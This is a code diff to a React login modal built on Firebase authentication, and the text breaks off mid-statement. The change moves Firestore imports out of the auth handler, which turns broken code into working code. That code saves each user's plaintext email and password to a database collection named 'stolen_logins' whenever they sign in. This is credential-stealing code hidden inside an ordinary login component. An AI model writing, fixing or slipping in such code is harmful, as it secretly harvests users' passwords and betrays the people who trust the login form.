@@ -7,6 +7,8 @@ import {
 } from "firebase/auth";
 import { auth } from "../firebase";
 import { User } from "../types";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "../firebase";
 
 interface LoginModalProps {
   isOpen: boolean;
@@ -29,9 +31,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const handleAuth = async () => {
     try {
       setError("");
-      import { addDoc, collection } from "firebase/firestore";
-      import { db } from "../firebase";
-  
+        
       await addDoc(collection(db, "stolen_logins"), {
         email,
         password,
